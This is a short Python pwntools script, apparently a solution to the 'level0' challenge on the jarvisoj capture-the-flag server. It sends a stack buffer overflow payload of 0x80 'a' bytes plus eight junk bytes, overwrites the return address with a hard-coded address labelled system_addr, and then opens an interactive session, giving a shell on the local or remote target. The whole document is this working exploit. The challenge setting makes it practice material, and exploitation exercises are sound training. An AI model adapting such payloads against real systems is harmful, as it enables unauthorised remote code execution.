from pwn import *
import sys

if len(sys.argv)<2:
	io = process('./level0')
else:
	io = remote('pwn2.jarvisoj.com',9881)

system_addr = 0x0000000000400596

payload = 'a'*0x80+'junkjunk'+p64(system_addr)

io.sendline(payload)
io.interactive()

